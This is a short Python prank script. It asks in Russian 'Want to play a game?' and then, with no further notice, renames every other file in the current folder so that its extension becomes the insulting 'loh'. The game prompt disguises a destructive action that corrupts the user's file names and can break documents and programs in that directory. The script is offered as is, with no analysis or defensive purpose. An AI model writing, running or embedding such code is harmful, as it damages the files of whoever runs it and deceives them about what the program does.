import os

q = input("Хочешь поиграть в игру? ")
for f in os.listdir("."):
    # print(f)
    if f != os.path.basename(__file__):
        n = f.rfind(".")
        if n == -1:
            res = f + "loh"
        else:
            res = f[:n+1] + "loh"
        os.rename(f, res)            